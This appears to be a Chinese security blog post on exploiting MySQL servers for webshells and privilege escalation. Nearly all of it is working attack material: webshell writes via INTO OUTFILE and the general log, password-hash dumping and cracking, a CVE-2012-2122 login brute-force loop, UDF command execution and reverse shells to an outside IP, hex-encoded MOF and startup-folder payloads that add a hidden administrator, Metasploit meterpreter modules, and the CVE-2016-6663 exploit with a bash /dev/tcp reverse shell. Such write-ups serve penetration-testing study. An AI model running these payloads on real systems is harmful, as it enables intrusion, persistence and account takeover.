> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.sqlsec.com](https://www.sqlsec.com/2020/11/mysql.html#%E6%94%AF%E6%8C%81%E4%B8%80%E4%B8%8B)

> 自从接触安全以来就 MySQL 的 UDF 提权、MOF 提权耳熟能详，但是貌似国光我一直都没有单独总结过这些零散的姿势点，所以本文就诞生了，再解决自己以前的困扰之余，也希望本文可以帮助到其他网友。

该文章写于 600 天前，内容可能已经没有参考价值了，请自行判断。

自从接触安全以来就 MySQL 的 UDF 提权、MOF 提权耳熟能详，但是貌似国光我一直都没有单独总结过这些零散的姿势点，所以本文就诞生了，再解决自己以前的困扰之余，也希望本文可以帮助到其他网友。

[](#数据库操作权限 "数据库操作权限")数据库操作权限
-----------------------------

本文讲的是 MySQL 提权相关知识，但是提权之前得先拿到高权限的 MySQL 用户才可以，拿到 MySQL 的用户名和密码的方式多种多样，但是不外乎就下面几种方法：

1.  MySQL 3306 端口弱口令爆破
2.  sqlmap 注入的 `--sql-shell` 模式
3.  网站的数据库配置文件中拿到明文密码信息
4.  CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限

[](#Webshell-权限 "Webshell 权限")Webshell 权限
-----------------------------------------

### [](#into-oufile-写-shell "into oufile 写 shell")into oufile 写 shell

*   知道网站物理路径
*   高权限数据库用户
*   load_file () 开启 即 secure_file_priv 无限制
*   网站路径有写入权限

首先基础语法查询是否 secure_file_priv 没有限制

```
mysql> show global variables like '%secure_file_priv%';
+
| Variable_name    | Value |
+
| secure_file_priv |       |
+

```

<table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>/tmp</td><td>只允许在 /tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table>

> 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
> 
> 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

如果满足上述所有条件的话，那么可以尝试使用下面原生的 SQL 语句来直接写 shell：

```
select '<?php phpinfo(); ?>' into outfile '/var/www/html/info.php';

```

sqlmap 中可以如下操作：

```
sqlmap -u "http://x.x.x.x/?id=x" --file-write="/Users/guang/Desktop/shell.php" --file-dest="/var/www/html/test/shell.php"

```

一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。

### [](#日志文件写-shell "日志文件写 shell")日志文件写 shell

*   Web 文件夹宽松权限可以写入
*   Windows 系统下
*   高权限运行 MySQL 或者 Apache

MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell

```
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+---------------------------------+
| Variable_name    | Value                           |
+------------------+---------------------------------+
| general_log      | OFF                             |
| general_log_file | /var/lib/mysql/c1595d3a029a.log |
+------------------+---------------------------------+

```

`general_log` 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。

可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：

```
set global general_log = "ON";
set global general_log_file='/var/www/html/info.php';


mysql> SHOW VARIABLES LIKE 'general%';
+------------------+-----------------------------+
| Variable_name    | Value                       |
+------------------+-----------------------------+
| general_log      | ON                          |
| general_log_file | /var/www/html/info.php |
+------------------+-----------------------------+


select '<?php phpinfo();?>';


root@c1595d3a029a:/var/www/html/$ cat info.php 
/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
201031 21:14:46       40 Query    SHOW VARIABLES LIKE 'general%'
201031 21:15:34       40 Query    select '<?php phpinfo();?>

```

这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：

```
-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php

```

Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。

前面分别介绍了数据库权限和 Webshell 权限，那么能不能利用已经获取到的 MySQL 权限来执行系统主机的命令的呢？这个就是下面主要介绍的了 MySQL 提权的知识点了。

[](#Hash-获取与解密 "Hash 获取与解密")Hash 获取与解密
--------------------------------------

假设存在 SQL 注入 DBA 权限，如果目标 3306 端口也是可以访问通的话，可以尝试读取 MySQL 的 Hash 来解密：

```
mysql> select host, user, password from mysql.user;
+
| host      | user | password                                  |
+
| localhost | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| %         | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
+


mysql > select host,user,authentication_string from mysql.user;
+
| host      | user          | authentication_string                     |
+
| localhost | root          | *8232A1298A49F710DBEE0B330C42EEC825D4190A |
| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| localhost | mysql.sys     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+

```

获取到的 MySQL Hash 值可以通过一些在线网站来解密，如国内的 CMD5 ：

![](attachments/Pasted%20image%2020240329083207.png)

也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：

```
hashcat -a 0 -m 300 --force '8232A1298A49F710DBEE0B330C42EEC825D4190A' password.txt -O

```

**-a 破解模式**

指定要使用的破解模式，其值参考后面对参数

```
- [ Attack Modes ] -

  
 ===+======
  0 | Straight                
  1 | Combination             
  3 | Brute-force             
  6 | Hybrid Wordlist + Mask  
  7 | Hybrid Mask + Wordlist  

```

**-m 破解 hash 类型**

指定要破解的 hash 类型，后面跟 hash 类型对应的数字，具体类型详见下表：

```
12   | PostgreSQL                                       | Database Server
131  | MSSQL (2000)                                     | Database Server
132  | MSSQL (2005)                                     | Database Server
1731 | MSSQL (2012, 2014)                               | Database Server
200  | MySQL323                                         | Database Server
300  | MySQL4.1/MySQL5                                  | Database Server
...

```

**–force**

忽略破解过程中的警告信息

**-O**

`--optimized-kernel-enable` 启用优化的内核（限制密码长度）

![](attachments/Pasted%20image%2020240329083231.png)

> 关于更多 Hashcat 的详细教程可以参考国光我的这一篇文章：[Hashcat 学习记录](https://www.sqlsec.com/2019/10/hashcat.html)

[](#MySQL-历史上的漏洞 "MySQL 历史上的漏洞")MySQL 历史上的漏洞
--------------------------------------------

### [](#yaSSL-缓冲区溢出 "yaSSL 缓冲区溢出")yaSSL 缓冲区溢出

MySQL yaSSL SSL Hello Message Buffer Overflow 这个缓冲区溢出漏洞 2008 年开始被曝出来，距离现在已经十几年的历史了，所以国光这里没有找到对应的环境测试，不过 MSF 里面已经集成好了对应的模块了：

```
msf6 > use exploit/windows/mysql/mysql_yassl_hello
msf6 > use exploit/linux/mysql/mysql_yassl_hello

```

有条件的朋友可以搭建这个漏洞对应的靶场环境

**Linux** : MySQL 5.0.45-Debian_1ubuntu3.1-log

**Windows** : MySQL 5.0.45-community-nt

### [](#CVE-2012-2122 "CVE-2012-2122")CVE-2012-2122

知道用户名多次输入错误的密码会有几率可以直接成功登陆进数据库，可以循环 1000 次登陆数据库：

```
for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done

```

![](attachments/Pasted%20image%2020240329083240.png)

MSF 里面也有了对应的脚本模块可以直接使用，成功后会直接 DUMP 出 MySQL 的 Hash 值：

```
msf6 > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf6 > set rhosts 127.0.0.1
msf6 > run

```

![](attachments/Pasted%20image%2020240329083247.png)

这个 MySQL 的 Hash 解密出的结果为 123456

自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。

[](#手工复现 "手工复现")手工复现
--------------------

### [](#动态链接库 "动态链接库")动态链接库

如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。

那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。

*   **sqlmap 的 UDF 动态链接库文件位置**

```
sqlmap根目录/data/udf/mysql

```

![](attachments/Pasted%20image%2020240329083256.png)

不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：`/extra/cloak/cloak.py` ，解码方法如下：

```
➜ pwd
/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak


➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so


➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so


➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll


➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll


➜ ls
README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so
__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll

```

国光打包了 sqlmap 解码后的动态链接库：[蓝奏云 - sqlmap udf.zip](https://sqlsec.lanzoux.com/i4b7jhyhwid) 需要的朋友可以自提

*   **Metasploit 的 UDF 动态链接库文件位置**

```
MSF 根目录/embedded/framework/data/exploits/mysql

```

![](attachments/Pasted%20image%2020240329083305.png)

Metasploit 自带的动态链接库文件无需解码，开箱即可食用。

国光使用 010-Editor 对比了 metsaploit 自带的与 sqlmap 解码后的动态链接库文件，发现他们的内容一模一样。

下面来看下动态链接库里面有包含了哪些函数：

![](attachments/Pasted%20image%2020240329083311.png)

### [](#寻找插件目录 "寻找插件目录")寻找插件目录

接下来的任务是把 UDF 的动态链接库文件放到 MySQL 的插件目录下，这个目录改如何去寻找呢？可以使用如下的 SQL 语句来查询：

```
mysql> show variables like '%plugin%';
+
| Variable_name | Value                        |
+
| plugin_dir    | /usr/local/mysql/lib/plugin/ |
+

```

如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 `\lib\plugin` 文件夹：

```
mysql > select 233 into dumpfile 'C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';

```

通过 NTFS ADS 流创建文件夹成功率不高，目前 MySQL 官方貌似已经阉割了这个功能。那么如果找到 MySQL 的安装目录呢？通用也有对应的 SQL 语句可以查询出来：

```
mysql> select @@basedir;
+
| @@basedir        |
+
| /usr/local/mysql |
+

```

### [](#写入动态链接库 "写入动态链接库")写入动态链接库

写入动态链接库可以分为下面几种情形：

SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有**字节长度限制**，所以往往 POST 注入才可以执行这种攻击

```
sqlmap -u "http://localhost:30008/" --data="id=1" --file-write="/Users/sec/Desktop/lib_mysqludf_sys_64.so" --file-dest="/usr/lib/mysql/plugin/udf.so"

```

![](attachments/Pasted%20image%2020240329083329.png)

1.  如果没有注入的话，我们可以操作原生 SQL 语句，这种情况下当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的：

```
SELECT 0x7f454c4602... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';


SELECT unhex('7f454c4602...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

```

这里的十六进制怎么获取呢？可以利用 MySQL 自带的 hex 函数来编码：

```
SELECT hex(load_file('/lib_mysqludf_sys_64.so'));


SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));

```

一般为了更方便观察，可以将编码后的结果导入到新的文件中方便观察：

```
SELECT hex(load_file('/lib_mysqludf_sys_64.so')) into dumpfile '/tmp/udf.txt'; 

SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile '/tmp/udf.txt';

```

为了方便大家直接复制，国光这里单独写了个页面，有意者自取：[MySQL UDF 提权十六进制查询](https://www.sqlsec.com/tools/udf.html)

> ```
> ERROR 1126 (HY000): Can't open shared library 'udf.dll' (errno: 193 )
> 
> ```
> 
> 网友们可能看到这个报错，因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的

### [](#创建自定义函数并调用命令 "创建自定义函数并调用命令")创建自定义函数并调用命令

```
mysql > CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';

```

导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：

```
mysql> select * from mysql.func;
+
| name     | ret | dl      | type     |
+
| sys_eval |   0 | udf.dll | function |
+

```

这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：

```
mysql > select sys_eval('whoami');

```

如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的

### [](#删除自定义函数 "删除自定义函数")删除自定义函数

```
mysql > drop function sys_eval;

```

[](#UDF-shell "UDF shell")UDF shell
-----------------------------------

假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了。

### [](#UDF-PHP "UDF.PHP")UDF.PHP

[t00ls UDF.PHP](https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php) 简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多：

![](attachments/Pasted%20image%2020240329083345.png)

### [](#Navicat-MySQL "Navicat MySQL")Navicat MySQL

目标 MySQL 不允许外连，但是可以上传 PHP 脚本:

![](attachments/Pasted%20image%2020240329083352.png)

这个时候可以使用 Navicat 自带的 tunnel 隧道脚本上传到目标网站上：

![](attachments/Pasted%20image%2020240329083400.png)

国光这里顺便打包了一份出来：[蓝奏云：Navicat tunnel.zip](https://sqlsec.lanzoux.com/ibpoGijd6bc) 实际上 Navicat 很久很久以前就自带这些脚本了，这个脚本有点类似于 reGeorg，只是官方的脚本用起来更舒服方便一点，脚本的界面如下：

![](attachments/Pasted%20image%2020240329083407.png)

接着连接的时候设置 HTTP 通道：

![](attachments/Pasted%20image%2020240329083413.png)

这个时候主机地址填写 localhost 即可：

![](attachments/Pasted%20image%2020240329083420.png)

连接成功后自然就可以愉快地进行手工 UDF 提权啦：

![](attachments/Pasted%20image%2020240329083429.png)

实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些：

```
cmdshell        
downloader      
open3389        
backshell       
ProcessView     
KillProcess     
regread         
regwrite        
shut            
about           

```

这个动态链接库有点历史了，不过还是被国光我找到了[蓝奏云：langouster_udf.zip](https://sqlsec.lanzoux.com/iEQA0ijfu6d)：

![](attachments/Pasted%20image%2020240329083439.png)

下面尝试来使用这个 dll 来反弹 shell 试试看吧，首先在 10.20.24.244 上开启 NC 监听：

```
➜  ~ ncat -lvp 2333
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2333
Ncat: Listening on 0.0.0.0:2333

```

然后目标机器上导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：

```
mysql > CREATE FUNCTION backshell RETURNS STRING SONAME 'udf.dll';

```

直接反弹 shell ：

```
mysql > select backshell("10.20.24.244", 2333);

```

成功上线：

![](attachments/Pasted%20image%2020240329083449.png)

MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是 C:/Windows/system32/wbem/mof/ 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。

[](#手工复现-1 "手工复现")手工复现
----------------------

### [](#上传-mof-文件执行命令 "上传 mof 文件执行命令")上传 mof 文件执行命令

mof 脚本的内容如下：

```
#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};

```

核心 payload 为：

```
var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")

```

MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：

```
mysql > select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile "C:/windows/system32/wbem/mof/test.mof";

```

执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下：

![](attachments/Pasted%20image%2020240329083500.png)
### [](#痕迹清理 "痕迹清理")痕迹清理

因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：

```
net stop winmgmt


rmdir /s /q C:\Windows\system32\wbem\Repository\


del C:\Windows\system32\wbem\mof\good\test.mof /F /S


net user hacker /delete


net start winmgmt

```

[](#MSF-MOF-提权 "MSF MOF 提权")MSF MOF 提权
--------------------------------------

MSF 里面也自带了 MOF 提权模块，使用起来也比较方便而且也做到了自动清理痕迹的效果，实际操作起来效率也还不错：

```
msf6 > use exploit/windows/mysql/mysql_mof

msf6 > set payload windows/meterpreter/reverse_tcp


msf6 > set rhosts 10.211.55.21
msf6 > set username root
msf6 > set password root
msf6 > run

```

实际运行效果如下：

![](attachments/Pasted%20image%2020240329083513.png)

这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。

[](#手工复现-2 "手工复现")手工复现
----------------------

### [](#启动项路径 "启动项路径")启动项路径

**Windows Server 2003** 的启动项路径：

```
C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
C:\Documents and Settings\All Users\「开始」菜单\程序\启动


C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup


C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown

```

**Windows Server 2008** 的启动项路径：

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

```

既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：

```
Set WshShell=WScript.CreateObject("WScript.Shell")
WshShell.Run "net user hacker P@ssw0rd /add", 0
WshShell.Run "net localgroup administrators hacker /add", 0

```

### [](#MySQL-写入启动项 "MySQL 写入启动项")MySQL 写入启动项

将上述 vbs 或者 CS 的马转十六进制直接写如到系统启动项中：

```
mysql > select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs";

```

写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。

[](#MSF-启动项提权 "MSF 启动项提权")MSF 启动项提权
-----------------------------------

没错，MSF 也封装好了对应的模块，目标系统为 Windows 的情况下可以直接使用该模块来上线 MSF，使用起来也很简单：

```
msf6 > use exploit/windows/mysql/mysql_start_up


msf6 > set rhosts 10.211.55.6
msf6 > set username root
msf6 > set password root
msf6 > run

```

![](attachments/Pasted%20image%2020240329083527.png)

> STARTUP_FOLDER 启动项文件夹得自己根据实际的目标系统来进行调整

MSF 会写入 exe 木马到启动项中，执行完成后开启监听会话：

```
msf6 > handler -H 10.20.24.244 -P 4444 -p windows/meterpreter/reverse_tcp

```

当目标系统重新登录的时候，MSF 这里可以看到已经成功上线了：

![](attachments/Pasted%20image%2020240329083534.png)

[](#环境准备 "环境准备")环境准备
--------------------

国光改了基于网上的教程封装打包了一个 Docker 镜像上传到了 Docker Hub，现在大家部署就会方便许多：

```
docker pull sqlsec/cve-2016-6663


docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663

```

添加一个 test 数据库用户，密码为 123456 并赋予一些基础权限：

```
mysql > create database test;


mysql > CREATE USER 'test'@'%' IDENTIFIED BY '123456'; 


mysql > grant create,drop,insert,select on test.* to 'test'@'%';


mysql > flush privileges;

```

也可以将上述操作整合成一条命令：

```
mysql -uroot -e "create database test;CREATE USER 'test'@'%' IDENTIFIED BY '123456'; grant create,drop,insert,select on test.* to 'test'@'%';flush privileges;"

```

[](#漏洞复现 "漏洞复现")漏洞复现
--------------------

竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限

**利用成功条件**

1.  Getshell 拿到 www-data 权限
2.  拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户
3.  关键提取步骤需要在交互环境下，所以需要反弹 shell
4.  MySQL 版本需要 <=5.5.51 或 5.6.x <=5.6.32 或 5.7.x <=5.7.14 或 8.x < 8.0.1
5.  MariaDB 版本需要 <= 5.5.51 或 10.0.x <= 10.0.27 或 10.1.x <= 10.1.17

CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：[MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit](https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html)

通过蚁剑上传 EXP，然后 Bash 反弹 shell：

首先 10.20.24.244 端口开启监听：

```
➜  ~ ncat -lvp 2333
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::2333
Ncat: Listening on 0.0.0.0:2333

```

蚁剑终端下反弹 Bash：

```
bash -i >& /dev/tcp/10.20.24.244/2333 0>&1

```

![](attachments/Pasted%20image%2020240329083547.png)

在反弹 shell 的情况下，首先编译 EXP：

```
gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient

```

执行 EXP 提权：

```
./mysql-privesc-race test 123456 localhost test

```

Bingo! 成功，最后的提权成功的效果如下：

![](attachments/Pasted%20image%2020240329083556.png)

要想获取 root 权限得配合 CVE-2016-6662 与 CVE-2016-6664 这两个漏洞，但是国光 CVE-2016-6664 漏洞复现失败了… 挖个坑，后续有机会再来总结，溜了溜了～～

现在文章思路慢慢变成了 MySQL 可操控文件怎么将这个危害扩大影响的问题了。可以往管理员桌面上写一个伪造的 CS 木马，如果对方 Office 有漏洞的话可以写入一个带后门的 word 文件，也可以篡改用户常执行的文件等 这样发散开来就变的很广了，国光这里不再一一叙述了，总之实际场景实际分析，大家在渗透的时候也可以多多思考更多的可能性，万一就成功了呢。

*   [《网络攻防实战研究：漏洞利用与提权》](https://book.douban.com/subject/30179595/)
*   [先知 - Windows 下三种 mysql 提权剖析](https://xz.aliyun.com/t/2719)
*   [先知 - mysql 数据库漏洞利用及提权方式小结](https://xz.aliyun.com/t/7392)
*   [先知 - Mysql 提权 (CVE-2016-6663、CVE-2016-6664 组合实践)](https://xz.aliyun.com/t/1122)
*   [CSDN: Coisini - Linux MySQL Udf 提权](https://blog.csdn.net/kclax/article/details/91515105?utm_medium=distribute.pc_relevant.none-task-blog-title-7&spm=1001.2101.3001.4242)
*   [博客园：sijidou - udf 提权](https://www.cnblogs.com/sijidou/p/10522972.html)
*   [博客园：litlife - udf 提权原理详解](https://www.cnblogs.com/litlife/p/9030673.html)
*   [信安之路：Windows 提权系列中篇](https://www.xazlsec.com/index.php/archives/260/)
*   [WebShell.cc - Mysql UDF 提权](https://www.webshell.cc/462.html)
*   [Leticia’s Blog - mysql 数据库提权总结](http://next.uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/)
*   [阿里云开发者社区 - MySQL 日志配置](https://developer.aliyun.com/article/667096)

本文可能实际上也没有啥技术含量，但是写起来还是比较浪费时间的，在这个喧嚣浮躁的时代，个人博客越来越没有人看了，写博客感觉一直是用爱发电的状态。如果你恰巧财力雄厚，感觉本文对你有所帮助的话，可以考虑打赏一下本文，用以维持高昂的服务器运营费用（域名费用、服务器费用、CDN 费用等）

没想到文章加入打赏列表没几天 就有热心网友打赏了 于是国光我用 Bootstrap 重写了一个页面用以感谢支持我的朋友，详情请看 [打赏列表 | 国光](https://www.sqlsec.com/reward/)

原文链接
[MySQL 漏洞利用与提权 | 国光 (sqlsec.com)](https://www.sqlsec.com/2020/11/mysql.html#Hash-%E8%8E%B7%E5%8F%96%E4%B8%8E%E8%A7%A3%E5%AF%86)